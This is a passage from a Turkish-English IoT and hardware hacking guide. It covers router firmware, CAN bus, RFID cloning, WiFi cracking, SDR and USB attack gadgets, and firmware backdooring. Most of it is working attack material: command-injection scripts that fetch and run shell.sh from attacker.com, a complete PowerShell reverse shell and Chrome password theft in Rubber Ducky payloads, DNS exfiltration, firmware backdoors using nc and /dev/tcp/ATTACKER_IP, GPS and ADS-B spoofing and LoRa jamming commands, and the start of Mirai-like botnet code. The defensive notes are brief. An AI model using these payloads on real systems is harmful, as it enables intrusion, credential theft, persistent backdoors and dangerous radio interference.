- Replay attacks

---

## 5.2 Router Firmware Hacking

### Scenario: TP-Link Router Backdoor

**Adımlar:**

**1. Firmware İndirme:**
```bash
wget https://static.tp-link.com/firmware.bin
```

**2. Extraction:**
```bash
binwalk -e firmware.bin
cd _firmware.bin.extracted
ls -la
# Genellikle squashfs-root/ bulunur
```

**3. Filesystem Analizi:**
```bash
cd squashfs-root/
find . -name "*.conf" | xargs grep -i "password"
find . -name "*.sh" | xargs grep -i "telnet\|backdoor"
```

**4. Web Interface Analizi:**
```bash
cd www/
grep -r "eval\|exec\|system" *.php
# Command injection araştırması
```

**5. Binary Analizi (httpd):**
```bash
file bin/httpd
# ELF 32-bit LSB executable, MIPS

strings bin/httpd | grep -i "admin\|root\|password"

# Ghidra ile detaylı analiz
ghidra &
# Import bin/httpd
```

**6. Emulation:**
```bash
# QEMU ile çalıştırma
sudo chroot . ./bin/httpd
# veya
firmadyne ile otomatik
```

**7. Exploit Geliştirme:**
```python
import requests

# Command injection
payload = "; wget http://attacker.com/shell.sh; sh shell.sh #"
response = requests.post(
    "http://192.168.1.1/cgi-bin/admin",
    data={"command": payload},
    auth=("admin", "admin")
)
```

**Gerçek Zafiyet Örnekleri:**
- CVE-2020-10882: TP-Link command injection
- CVE-2021-20090: Multiple routers RCE
- CVE-2022-26258: D-Link backdoor account

---

## 5.3 Car Hacking

### Scenario: CAN Bus Message Injection

**Araçlar:**
- CANtact / OBD-II adapter
- SocketCAN (Linux)
- ICSim (practice tool)

**Setup:**
```bash
# 1. Install can-utils
sudo apt install can-utils

# 2. Bring up CAN interface
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0

# 3. Monitor CAN traffic
candump can0

# 4. Practice with ICSim
git clone https://github.com/zombieCraig/ICSim
cd ICSim
make
./icsim vcan0 &
./controls vcan0
```

**Real Attack:**
```bash
# Unlock doors (hypothetical)
cansend can0 123#FF00000000000000

# Speedometer manipulation
while true; do
  cansend can0 456#00$SPEED0000000000
  sleep 0.1
done
```

**Savunma:**
- CAN message authentication (CMAC)
- Network segmentation
- Anomaly detection

---

## 5.4 RFID Cloning

### Scenario: Office Access Card

**Araçlar:**
- Proxmark3 RDV4

**Low Frequency (125kHz):**
```bash
# Read EM410x card
proxmark3> lf search
# EM410x Tag ID: 1234567890

# Clone to T5577
proxmark3> lf em 410x clone 1234567890
```

**High Frequency (13.56MHz Mifare):**
```bash
# Check card type
proxmark3> hf search
# Mifare Classic 1K

# Autopwn (automated attack)
proxmark3> hf mf autopwn

# Manual key attack
proxmark3> hf mf chk *1 ? t
# Keys found: FFFFFFFFFFFF, A0A1A2A3A4A5

# Dump data
proxmark3> hf mf dump

# Clone to magic card
proxmark3> hf mf cload dump.eml
```

---

# BÖLÜM 6: ÖĞRENME YOL HARİTASI

## 6.1 Temel Bilgiler (0-3 Ay)

### Elektronik Temelleri
```
✓ Ohm Kanunu (V = I × R)
✓ Temel bileşenler:
  - Resistor (Direnç)
  - Capacitor (Kondansatör)
  - Transistor
  - LED, Diode
✓ Multimetre kullanımı
✓ Breadboard prototyping
```

**Projeler:**
1. LED yakma (Arduino)
2. Button input okuma
3. Sensör okuma (DHT11 sıcaklık)

### Communication Protocols
```
✓ UART (Serial)
  - TX, RX pinleri
  - Baud rate
  - Start/stop bits

✓ SPI (Serial Peripheral Interface)
  - MOSI, MISO, SCK, CS
  - Full-duplex
  - Fast

✓ I2C (Inter-Integrated Circuit)
  - SDA, SCL
  - Multi-master
  - Address-based
```

**Pratik:**
```python
# Arduino: UART ile veri gönderme
Serial.begin(9600);
Serial.println("Hello from UART!");

# I2C Scanner
Wire.begin();
Wire.beginTransmission(address);
if (Wire.endTransmission() == 0) {
  Serial.print("Found device at 0x");
  Serial.println(address, HEX);
}
```

---

## 6.2 IoT Güvenlik (3-6 Ay)

### WiFi Security
```
WEP  → ❌ BROKEN (2001)
WPA  → ❌ DEPRECATED (2003)
WPA2 → ⚠️  OK (KRACK attack 2017)
WPA3 → ✅ RECOMMENDED (2018)
```

**Saldırılar:**
```bash
# 1. WPA2 Handshake capture
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 2. Deauth to force reconnect
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# 3. Crack with wordlist
aircrack-ng -w rockyou.txt capture-01.cap

# 4. Or Hashcat (GPU accelerated)
hashcat -m 22000 capture.hc22000 rockyou.txt
```

**Savunma:**
- WPA3 kullanımı
- Güçlü passphrase (20+ karakter)
- MAC filtering (zayıf ama ekstra katman)
- SSID hiding (zayıf ama ekstra katman)

### BLE Security
```
Pairing Methods:
1. Just Works        → ❌ No security
2. Passkey Entry     → ⚠️  OK (6-digit PIN)
3. Numeric Comparison→ ✅ Better
4. Out of Band (NFC) → ✅ Best
```

**Common Vulnerabilities:**
- Unencrypted characteristics
- Hardcoded PINs
- No authentication

---

## 6.3 Hardware Hacking (6-12 Ay)

### UART Exploitation

**Pin Identification:**
```
VCC  → ~3.3V or 5V (always on)
GND  → 0V
TX   → Idle high (~3.3V), fluctuates when transmitting
RX   → Idle high, receives data
```

**Tools:**
- Multimeter (voltage check)
- Logic analyzer (signal identification)
- USB-to-UART adapter (FT232, CP2102)

**Exploitation:**
```bash
# 1. Find baud rate
baudrate.py -p /dev/ttyUSB0
# Common: 9600, 38400, 57600, 115200

# 2. Connect with screen
screen /dev/ttyUSB0 115200

# 3. Interrupt boot process (press key during boot)
# You might get bootloader shell (U-Boot)

# 4. Modify boot parameters
setenv bootargs "root=/dev/mtdblock2 init=/bin/sh"
boot

# Now you have root shell!
```

**Real Example: Router UART Root:**
```
1. Open router case
2. Identify 4-pin header
3. Connect GND, TX, RX (NOT VCC usually)
4. Power on router
5. Press Enter during boot
6. Modify bootargs to /bin/sh
7. Mount filesystem read-write
8. Change root password
9. Enable telnet/SSH
10. Persistent backdoor
```

---

### JTAG Debugging

**Pin Identification:**
```
TDI  → Test Data In
TDO  → Test Data Out
TCK  → Test Clock
TMS  → Test Mode Select
TRST → Test Reset (optional)
```

**Tools:**
- JTAGulator (automatic detection)
- OpenOCD (debugging software)
- Bus Pirate (cheap alternative)

**Process:**
```bash
# 1. Automatic JTAG detection
jtagulator
> i  # idcode scan
> Enter voltage (3.3)
# Pins found!

# 2. OpenOCD connection
openocd -f interface/jlink.cfg -f target/stm32f1x.cfg

# 3. Telnet to OpenOCD
telnet localhost 4444

# 4. Dump flash
> flash read_bank 0 firmware.bin

# 5. Modify firmware
# ... edit firmware.bin ...

# 6. Write back
> flash write_bank 0 firmware_mod.bin 0
```

---

### Side-Channel Attacks

**Power Analysis:**
```python
# ChipWhisperer example
import chipwhisperer as cw

scope = cw.scope()
target = cw.target(scope)

# Capture power traces during AES encryption
traces = []
for key_guess in range(256):
    scope.arm()
    target.simpleserial_write('p', plaintext)
    scope.capture()
    trace = scope.get_last_trace()
    traces.append(trace)

# Perform CPA attack
results = cw.analyzer.cpa(traces, plaintexts)
recovered_key = results.find_key()
```

**Glitch Attacks:**
```
1. Identify critical instruction (e.g., password check)
2. Monitor power consumption
3. Inject voltage glitch at precise moment
4. Skip security check
```

---

## 6.4 Firmware Reverse Engineering (12-18 Ay)

### Architecture Basics

**ARM Assembly:**
```assembly
; Function prologue
push {r4, lr}      ; Save registers
sub sp, sp, #16    ; Allocate stack space

; Function body
mov r0, #42        ; Return value = 42

; Function epilogue
add sp, sp, #16    ; Deallocate stack
pop {r4, pc}       ; Restore and return
```

**MIPS Assembly:**
```assembly
addiu $sp, $sp, -8   ; Allocate stack
sw $ra, 4($sp)       ; Save return address

li $v0, 42           ; Return value = 42

lw $ra, 4($sp)       ; Restore return address
addiu $sp, $sp, 8    ; Deallocate stack
jr $ra               ; Return
```

### Vulnerability Discovery

**Buffer Overflow:**
```c
// Vulnerable code
void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
}

// Exploit
payload = "A" * 64 + struct.pack("<I", 0x41424344)  # Overwrite return address
```

**Format String:**
```c
// Vulnerable
printf(user_input);  // ❌

// Safe
printf("%s", user_input);  // ✅

// Exploit
%x %x %x %x         # Leak stack
%n                  # Write to memory
```

**Command Injection:**
```c
// Vulnerable
system(user_input);  // ❌

// Exploit example
input = "google.com; rm -rf /"
```

---

# BÖLÜM 7: İLERİ SEVİYE IoT GADGETS (Tam Liste)

## 7.1 WiFi & Network Hacking Gadgets

### WiFi Pineapple Serisi (Detaylı)
**Mark VII (En Yeni):**
- **Fiyat:** ~$99 (Tetra) / $199 (Enterprise)
- **Özellikler:**
  - Dual-band (2.4GHz + 5GHz)
  - 4 core ARM CPU
  - 128MB RAM
  - USB-C powered
  - Web UI management
  - Cloud C2 integration

**Saldırı Modülleri:**
```bash
# 1. Evil Portal
- Fake captive portal
- Credential harvesting
- Template library (Starbucks, Hotel, etc.)

# 2. Recon
- Client probing
- Hidden SSID discovery
- Vendor identification

# 3. Deauth
- Selective deauthentication
- Client disconnection
- Force reconnection to Evil Twin

# 4. PineAP
- SSID spoofing
- Honey pot
- Auto-association

# 5. SSL Split
- HTTPS downgrade
- Certificate spoofing
- Traffic interception
```

**Gerçek Dünya Senaryosu:**
```
1. Setup Evil Twin (Starbucks WiFi)
2. Deauth legitimate clients
3. Clients auto-connect to Evil Twin
4. Captive portal: "Enter email for free WiFi"
5. Harvest credentials
6. MitM all traffic
7. Inject JavaScript/modify pages
```

---

### Packet Squirrel
- **Fiyat:** ~$59
- **Boyut:** Kibrit kutusu kadar
- **Kullanım:** Man-in-the-Middle, remote access
```
Features:
- Ethernet tap (pass-through)
- 4G LTE connectivity (with modem)
- VPN tunnel to attacker
- Payload scripts (Bash)
- Switch-based modes

Saldırı Payloads:
1. tcpdump → Remote packet capture
2. VPN tunnel → Persistent access
3. DNS spoofing → Redirect traffic
4. SMB capture → Credential theft
```

---

### LAN Turtle
- **Fiyat:** ~$59
- **Görünüm:** Normal USB Ethernet adapter
- **Kullanım:** Covert remote access
```
Modules:
- AutoSSH: Persistent reverse shell
- Responder: LLMNR/NBT-NS poisoning
- Nmap: Network scanning
- URLSnarf: HTTP traffic monitoring
- DNSSpoof: DNS hijacking
```

**Deployment Scenario:**
```
1. Plug into target network (looks innocent)
2. AutoSSH reverse tunnel to attacker server
3. Attacker connects through tunnel
4. Full internal network access
5. Pivot to other systems
```

---

### Shark Jack
- **Fiyat:** ~$99
- **Kullanım:** Network reconnaissance in 7 seconds
```
Payloads:
1. Nmap scan → Discover hosts/services
2. Responder → Capture hashes
3. Packet capture → Save to cloud
4. Subnet info → Document network

LED Indicators:
- Yellow: Setting up
- Blue: Attack running
- Green: Success
- Red: Failed
```

---

### WiFi Coconut
- **Fiyat:** ~$99
- **Özellik:** 14 WiFi radios in one device!
```
Use Cases:
- Simultaneous monitoring of ALL WiFi channels
- Multi-band sniffing (2.4 + 5 GHz)
- Handshake capture (no channel hopping)
- Site survey
- Rogue AP detection

Advantage over single adapter:
Normal: Channel hopping, miss packets
Coconut: Monitor all channels simultaneously
```

---

## 7.2 RF & Radio Hacking (Detaylı)

### Flipper Zero (Kapsamlı)
**Hardware:**
- Sub-1GHz radio (300-928 MHz)
- 125kHz RFID (EM410x, HID Prox)
- 13.56MHz NFC (Mifare, NTAG)
- Infrared transceiver
- iButton (Dallas 1-Wire)
- GPIO pins (I2C, UART, SPI)
- USB (BadUSB mode)

**Gerçek Saldırı Örnekleri:**

**1. Rolling Code Garage Door:**
```
Older systems: Fixed code
- Capture: Record signal
- Replay: Open door

Newer systems: Rolling code (KeeLoq)
- Jam + Record: Block legitimate signal while recording
- Replay: Use captured rolling code once
```

**2. Hotel Room Key (RFID):**
```
1. Read card: 125kHz/13.56MHz
2. Clone to blank card (T5577/UID writable)
3. Access room

Defense: Encrypted cards (Mifare DESFire)
```

**3. Tesla Charging Port:**
```
Frequency: 433.92 MHz
Signal: ASK/OOK modulated
Result: Open charging port (harmless prank)

Demo: Sub-GHz → Read RAW → Replay
```

**4. BadUSB Attacks:**
```python
# Flipper BadUSB script
REM Open terminal and download payload
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 200
STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).downloadString('http://attacker.com/payload.ps1')"
ENTER
```

**5. NFC Payment Card Cloning:**
```
⚠️ Modern cards: EMV with dynamic CVV
❌ Cannot clone for payment
✅ Can read card number (for phishing)
✅ Can relay transaction (NFC relay attack)
```

---

### HackRF One (Detaylı Kullanım)

**Frequency Range:** 1 MHz - 6 GHz

**Saldırı Senaryoları:**

**1. GPS Spoofing:**
```bash
# Generate fake GPS signal
gps-sdr-sim -e brdc3540.14n -l 39.9042,116.4074,100 -o gpssim.bin

# Transmit with HackRF
hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 0

Result: Target device shows fake location
Use case: Pokémon GO spoofing, drone misdirection
```

**2. ADS-B Aircraft Spoofing:**
```bash
# Generate fake aircraft position
python adsb_encoder.py --callsign "ABC123" --lat 40.7128 --lon -74.0060

# Transmit on 1090 MHz
hackrf_transfer -t fake_plane.iq -f 1090000000 -s 2000000

Result: Fake aircraft appears on ADS-B receivers
```

**3. Car Key Fob (Rolling Code):**
```bash
# Capture rolling code
hackrf_transfer -r capture.iq -f 433920000 -s 2000000

# Analyze in URH (Universal Radio Hacker)
# Decode, replay (only works once)
```

**4. Wireless Doorbell Replay:**
```bash
# Record doorbell press
hackrf_transfer -r doorbell.iq -f 433920000 -s 2000000 -n 1000000

# Replay to annoy neighbor 😈
hackrf_transfer -t doorbell.iq -f 433920000 -s 2000000 -a 1 -x 20
```

**5. LoRa Jamming:**
```bash
# Jam 868/915 MHz LoRa frequencies
hackrf_transfer -t /dev/urandom -f 868000000 -s 2000000 -a 1 -x 47

Result: Disrupt LoRa IoT devices
```

---

### Proxmark3 RDV4 (Profesyonel RFID)

**Supported Frequencies:**
- 125 kHz (LF)
- 13.56 MHz (HF)

**Protocols:**

**Low Frequency (125 kHz):**
```
- EM410x (read-only ID cards)
- HID Prox (access control)
- Indala
- T55xx (writable)
- Hitag (car immobilizer)
```

**High Frequency (13.56 MHz):**
```
- Mifare Classic (1K/4K) - Widely used, crypto broken
- Mifare Ultralight - No encryption
- Mifare DESFire - Strong encryption (hard to clone)
- iClass - Corporate access control
- ISO14443A/B
- ISO15693
```

**Attack Examples:**

**1. Mifare Classic - Nested Attack:**
```bash
# Known key attack (one sector has default key)
proxmark3> hf mf chk *1 ? t

# Found key: FFFFFFFFFFFF on sector 0
# Use it to find other keys (nested attack)
proxmark3> hf mf nested 1 0 A FFFFFFFFFFFF t

# All keys recovered!
# Dump entire card
proxmark3> hf mf dump

# Clone to magic card
proxmark3> hf mf cload dumpdata.eml
proxmark3> hf mf csetblk 0 XXXXX...
```

**2. HID Prox (Corporate Badge):**
```bash
# Read card
proxmark3> lf hid read
HID Prox TAG ID: 2006f623db (10203)

# Clone to T5577
proxmark3> lf hid clone 2006f623db

# Or emulate (no physical card needed)
proxmark3> lf hid sim 2006f623db
# Proxmark now acts as the card!
```

**3. Hitag2 (Car Key):**
```bash
# Crack 48-bit key
proxmark3> lf hitag snoop
proxmark3> lf hitag crack

# Clone key
proxmark3> lf hitag clone
```

**4. Relay Attack (NFC):**
```python
# Two Proxmarks needed
# Proxmark A: Near card
# Proxmark B: Near reader

# Forward requests/responses in real-time
# Bypass distance limitation
# Works on contactless payment terminals
```

---

### YARD Stick One (Sub-GHz Swiss Army Knife)

**Frequency:** 300-348 MHz, 391-464 MHz, 782-928 MHz

**RfCat Framework:**
```python
from rflib import *

d = RfCat()

# Set frequency (433.92 MHz - garage doors)
d.setFreq(433920000)

# Set modulation (ASK/OOK)
d.setMdmModulation(MOD_ASK_OOK)

# Set data rate
d.setMdmDRate(4800)

# Scan for signals
d.setModeRX()
while True:
    data = d.RFrecv()
    print(data.encode('hex'))

# Replay attack
captured_signal = "0110101010..."
d.setModeTX()
d.RFxmit(captured_signal.decode('hex'))
```

**Real Attacks:**
```python
# 1. Wireless doorbell
# Frequency: 433.92 MHz
# Modulation: ASK/OOK
# Capture, replay

# 2. Tire pressure sensors (TPMS)
# Frequency: 315/433 MHz
# Can read tire pressure, temperature
# Inject false data

# 3. Weather stations
# Frequency: 433/868/915 MHz
# Spoof temperature data
```

---

## 7.3 USB Hacking Gadgets

### O.MG Cable
- **Fiyat:** ~$120-180
- **Görünüm:** 100% normal Lightning/USB-C kablo
```
Features:
- Built-in WiFi (remote control)
- Keystroke injection
- Geofencing (trigger on GPS location)
- Self-destruct (wipe firmware)
- Looks identical to Apple cable

Attack Scenarios:
1. Leave on desk → "Free charging cable"
2. User plugs in
3. Attacker connects via WiFi (300ft range)
4. Execute payload
5. Reverse shell, exfiltrate data
```

**Payload Example:**
```javascript
// JavaScript interface
omg.type("cmd\n");
omg.delay(1000);
omg.type("powershell IEX(IWR bit.ly/evil)\n");
```

---

### USB Rubber Ducky
- **Fiyat:** ~$80
- **Storage:** microSD card
```
DuckyScript Language:
REM Comment
DELAY 1000         # Wait 1 second
GUI r              # Windows + R
STRING notepad     # Type text
ENTER              # Press Enter
CTRL-ALT DELETE    # Key combinations
```

**Advanced Payloads:**

**1. Reverse Shell (Windows):**
```
REM Download and execute payload
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "$c=New-Object Net.Sockets.TCPClient('attacker.com',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
ENTER
```

**2. Credential Harvesting:**
```
REM Extract Chrome passwords
GUI r
DELAY 200
STRING powershell -w hidden
ENTER
DELAY 1000
STRING [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect([System.IO.File]::ReadAllBytes("$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"),$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))
ENTER
```

**3. Exfiltration via DNS:**
```
REM Exfiltrate data through DNS queries
STRING $data=hostname; nslookup "$data.attacker.com"
ENTER
```

---

### Bash Bunny
- **Fiyat:** ~$120
- **Özellik:** Multi-mode USB attack platform
```
Modes (Switch positions):
- Switch 1: Attack mode
- Switch 2: Arming mode
- Switch 3: Attack mode

Attack Modules:
1. QuickCreds: Extract browser passwords
2. SMB Exfiltrator: Copy files to Bunny
3. TCP/UDP Tunnel: Network bridge
4. DNS Spoof: Redirect traffic
```

**Payload Structure:**
```bash
#!/bin/bash
# payload.txt

LED SETUP

# Ethernet mode
ATTACKMODE RNDIS_ETHERNET

# Configure network
GET TARGET_IP
GET TARGET_HOSTNAME

# Run attack
python /root/payload.py

# Exfiltrate to Bunny storage
cp /target/data.txt /root/udisk/loot/

LED FINISH
```

---

### USBKill
- **Fiyat:** ~$50-100
- **⚠️ DESTRUCTIVE:** Fries any USB port
```
Mechanism:
1. Plug into USB port
2. Charge capacitors from USB power
3. Discharge 220V back into USB port
4. Destroy motherboard

Result: Permanent hardware damage

Defense:
- USB port blockers
- Software: USBGuard
- Physical security
```

---

## 7.4 Bluetooth & BLE Hacking

### Ubertooth One (Detaylı)
```
Capabilities:
- Bluetooth Classic monitoring
- BLE (Bluetooth Low Energy) sniffing
- Frequency hopping following
- Packet injection

Limitations:
❌ Cannot decrypt encrypted BLE
✅ Can capture pairing process
✅ Can jam Bluetooth
✅ Can discover hidden devices
```

**Crackle - BLE Cracking:**
```bash
# Capture pairing process
ubertooth-btle -f -c pairing.pcap

# Crack TK (Temporary Key)
crackle -i pairing.pcap -o decrypted.pcap

# If successful, decrypt all traffic
# Works only if "Just Works" or weak passkey
```

**Btlejack - BLE Swiss Army Knife:**
```bash
# Install
pip install btlejack

# Scan for BLE devices
btlejack -s

# Sniff connection
btlejack -f 0x129f3244 -f 0x239a3355

# Jam connection
btlejack -j AA:BB:CC:DD:EE:FF
```

---

### Bluetooth Sniffer (nRF52840)
- **Fiyat:** ~$200-300
- **Software:** Wireshark + nRF Sniffer plugin
```
Setup:
1. Install nRF Sniffer for Bluetooth LE
2. Flash nRF52840 dongle
3. Open Wireshark
4. Select nRF Sniffer interface
5. Start capture

Analyze:
- Pairing process
- Service discovery (GATT)
- Read/write characteristics
- Notification/indications
```

---

## 7.5 Automotive Hacking

### CAN Bus Tools

**CANtact Pro:**
- **Fiyat:** ~$150
- **Channels:** 2x CAN, 2x LIN
```bash
# SocketCAN setup (Linux)
sudo ip link set can0 type can bitrate 500000
sudo ip link set can0 up

# Capture CAN traffic
candump can0

# Send CAN message
cansend can0 123#DEADBEEF

# Replay attack
canplayer -I capture.log
```

**Comma.ai Panda:**
- **Fiyat:** ~$200
- **Özellik:** USB-to-CAN, OpenPilot uyumlu
```python
from panda import Panda

p = Panda()

# Read CAN messages
while True:
    msgs = p.can_recv()
    for msg in msgs:
        print(hex(msg[0]), msg[2].hex())

# Send CAN message
p.can_send(0x123, b"\xDE\xAD\xBE\xEF", 0)
```

**ICSim - Practice Tool:**
```bash
# Virtual CAN setup
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

# Run ICSim (virtual car dashboard)
./icsim vcan0 &
./controls vcan0

# Now practice CAN hacking safely!
```

---

### OBD-II Hacking
```
OBD-II Pinout:
- Pin 6: CAN High
- Pin 14: CAN Low
- Pin 16: 12V power
- Pin 4/5: Ground

Standard PIDs (Parameter IDs):
0x01 0x0C → Engine RPM
0x01 0x0D → Vehicle speed
0x01 0x05 → Coolant temperature

Custom PIDs (manufacturer specific):
Toyota: 0x7E0-0x7E7
Ford: 0x7E0-0x7EF
```

**SavvyCAN - Analysis Tool:**
```
Features:
- DBC file import (CAN database)
- Fuzzing
- Reverse engineering
- Graph visualization
- Scripting
```

---

# BÖLÜM 8: FIRMWARE HACKING (Kapsamlı)

## 8.1 Firmware Extraction Yöntemleri

### 1. UART Extraction
```bash
# Bootloader (U-Boot) shell erişimi
# Boot sırasında tuşa bas
> printenv
bootcmd=bootm 0x9f020000
bootargs=console=ttyS0,115200

# Flash dump
> md.b 0x9f000000 0x400000 > dump.txt
# veya
> tftpput 0x9f000000 0x400000 192.168.1.100:dump.bin
```

### 2. JTAG Extraction
```bash
# OpenOCD ile
openocd -f interface/jlink.cfg -f target/router.cfg

# Telnet bağlantısı
telnet localhost 4444

# Flash dump
> flash read_bank 0 firmware.bin 0 0x400000
```

### 3. SPI Flash Extraction
```bash
# CH341A programmer ile
flashrom -p ch341a_spi -r firmware.bin

# In-circuit (SOIC clip ile)
flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=1000 -r firmware.bin
```

### 4. eMMC/SD Card Extraction
```bash
# SD kart okuyucu ile
dd if=/dev/mmcblk0 of=emmc_dump.img bs=1M

# veya
sudo apt install android-sdk-platform-tools
adb pull /dev/block/mmcblk0 emmc.img
```

### 5. Manufacturer Debug Interface
```
Qualcomm EDL (Emergency Download Mode):
- Firehose protocol
- QFIL tool
- Extracts entire flash

MediaTek Preloader:
- SP Flash Tool
- Read back firmware

Broadcom CFE:
- TFTP server mode
- Network extraction
```

---

## 8.2 Firmware Analiz Teknikleri

### Binwalk - Detaylı Kullanım
```bash
# Temel signature scan
binwalk firmware.bin

# Entropy analizi (şifreleme tespiti)
binwalk -E firmware.bin
# Yüksek entropy = şifrelenmiş/sıkıştırılmış
# Düşük entropy = plaintext

# Extract all
binwalk -e firmware.bin

# Extract specific offset
binwalk -e --dd='.*' firmware.bin

# Custom signature
binwalk -R "\x7fELF" firmware.bin  # ELF binary arama

# Opcodes scan
binwalk -A firmware.bin  # ARM opcodes
```

### Firmware Analysis Toolkit
```bash
# Otomatik analiz
./fat.py firmware.bin

# İşlem adımları:
1. Extract filesystem (binwalk)
2. Identify architecture (ARM, MIPS, etc.)
3. Extract kernel
4. Emulate with QEMU
5. Network configuration
6. Vulnerability scanning
```

### Manual Filesystem Analysis
```bash
cd _firmware.extracted/squashfs-root/

# Hassas dosya arama
find . -name "*.conf" -o -name "*.cfg"
find . -name "shadow" -o -name "passwd"
find . -type f -executable

# Hardcoded credentials
grep -r "password\|passwd\|pwd" . 2>/dev/null
grep -r "admin\|root" . 2>/dev/null

# Private keys
find . -name "*.pem" -o -name "*.key" -o -name "id_rsa"

# Backdoor accounts
cat etc/shadow
cat etc/passwd

# Startup scripts (backdoor check)
cat etc/init.d/*
cat etc/rc.local
```

---

## 8.3 Binary Analysis

### String Analysis
```bash
# Extract readable strings
strings -n 8 httpd | grep -i "password\|admin\|key"

# UTF-16 strings
strings -e l binary

# Filter URLs
strings binary | grep -E "https?://"

# Find IPs
strings binary | grep -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"
```

### Ghidra Analysis
```
Workflow:
1. Import binary (File → Import File)
2. Analyze (Analysis → Auto Analyze)
3. Find main() function
4. Follow cross-references (Xrefs)
5. Decompile interesting functions
6. Look for:
   - Hardcoded credentials
   - Command injection points
   - Buffer overflows
   - Weak crypto

Shortcuts:
G → Go to address
L → Rename variable
; → Add comment
Ctrl+E → Edit function signature
```

### Radare2 Analysis
```bash
# Open binary
r2 firmware.bin

# Analyze all
aaa

# List functions
afl

# Disassemble main
pdf @ main

# Search for strings
iz | grep "admin"

# Find XREFs to function
axt @ sym.strcpy

# Hexdump
px 256 @ 0x08048000

# Visual mode
VV
```

---

## 8.4 Firmware Modification

### Backdoor Injection

**1. Add Telnet Service:**
```bash
cd squashfs-root/

# Edit startup script
echo "telnetd -l /bin/sh &" >> etc/init.d/rcS

# Or systemd service
cat > etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor Service

[Service]
ExecStart=/usr/bin/nc -l -p 1337 -e /bin/bash

[Install]
WantedBy=multi-user.target
EOF
```

**2. Add SSH Key:**
```bash
# Create .ssh directory
mkdir -p root/.ssh/

# Add your public key
echo "ssh-rsa AAAA..." > root/.ssh/authorized_keys
chmod 600 root/.ssh/authorized_keys

# Enable SSH
sed -i 's/PermitRootLogin no/PermitRootLogin yes/' etc/ssh/sshd_config
```

**3. Reverse Shell:**
```bash
# Add to startup
echo "ncat 攻擊者IP 4444 -e /bin/bash &" >> etc/init.d/rcS

# Or cron job
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" > etc/crontab
```

### Repackaging Firmware

**Squashfs:**
```bash
# Extract
unsquashfs firmware.bin

# Modify files...
# ...

# Repack (match original compression)
mksquashfs squashfs-root new-squashfs.bin -comp xz -b 256k

# Check if size matches
ls -lh firmware.bin new-squashfs.bin
```

**JFFS2:**
```bash
# Extract
jefferson firmware.jffs2 -d output/

# Repack
mkfs.jffs2 -r output/ -o new-firmware.jffs2 -e 0x10000 -p
```

**UBI/UBIFS:**
```bash
# Unpack
ubireader_extract_images firmware.ubi

# Modify...

# Repack
ubinize -o new-firmware.ubi -p 128KiB -m 2048 ubinize.cfg
```

---

## 8.5 Firmware Emulation

### QEMU User Mode
```bash
# ARM binary on x86
sudo apt install qemu-user-static

# Copy ARM qemu to extracted filesystem
cp /usr/bin/qemu-arm-static squashfs-root/usr/bin/

# Chroot and execute
sudo chroot squashfs-root /usr/bin/qemu-arm-static /bin/busybox sh
```

### QEMU System Mode
```bash
# Full system emulation
qemu-system-mips \
  -M malta \
  -kernel vmlinux \
  -hda rootfs.ext2 \
  -append "root=/dev/hda console=ttyS0" \
  -nographic \
  -net nic -net user,hostfwd=tcp::2222-:22
```

### Firmadyne
```bash
# Automated router firmware emulation
git clone https://github.com/firmadyne/firmadyne
cd firmadyne

# Download prebuilt binaries
./download.sh

# Database setup
sudo apt install postgresql
sudo -u postgres createuser -P firmadyne
sudo -u postgres createdb -O firmadyne firmware

# Import firmware
./makeImage.sh -i 1 firmware.bin

# Run
./run.sh 1

# Access via web: http://192.168.1.1 (default)
```

---

## 8.6 Firmware Reverse Engineering - Gerçek Örnekler

### Örnek 1: TP-Link Router Backdoor (CVE-2020-10882)

**Zafiyet:** Undocumented telnet service

**Analiz:**
```bash
# Extract firmware
binwalk -e TP-Link_TL-WR940N.bin

# Check init scripts
cat squashfs-root/etc/init.d/rcS

# Found:
telnetd -l /bin/sh -p 23 &  # Backdoor!

# But only accessible from LAN, not WAN
# Firewall rules allow local telnet
```

**Exploit:**
```bash
# If on same network:
telnet 192.168.1.1
# No password required!
# Root shell obtained
```

---

### Örnek 2: D-Link Command Injection (CVE-2021-20090)

**Zafiyet:** Web interface command injection

**Analiz:**
```bash
# Extract and analyze httpd binary
strings httpd | grep "system("

# Decompile with Ghidra
# Find vulnerable function:
system("/usr/bin/upload.cgi " + user_input)
```

**Exploit:**
```python
import requests

# Command injection payload
payload = "; wget http://attacker.com/shell.sh; sh shell.sh #"

requests.post(
    "http://192.168.0.1/apply.cgi",
    data={"action": "upload", "file": payload}
)
```

---

### Örnek 3: IoT Camera Hardcoded Credentials

**Analiz:**
```bash
# Extract firmware
binwalk -e camera_firmware.bin

# Search for credentials
grep -r "admin\|root" squashfs-root/

# Found in /etc/shadow:
root:$1$ABCd1234$xyz...:0:0:root:/root:/bin/sh

# Crack weak hash
john --wordlist=rockyou.txt shadow.txt
# Password: admin123
```

---

## 8.7 Trojan/Malware Firmware Implants

### IoT Botnet Firmware (Mirai-like)

**Backdoor Characteristics:**
```c
// Hardcoded C2 servers
char *cnc[] = {
    "198.51.100.1",
    "203.0.113.1",
    "example.com"
};

// Default credentials scanner
char *creds[] = {
    "root:root",
    "admin:admin",
    "admin:password",
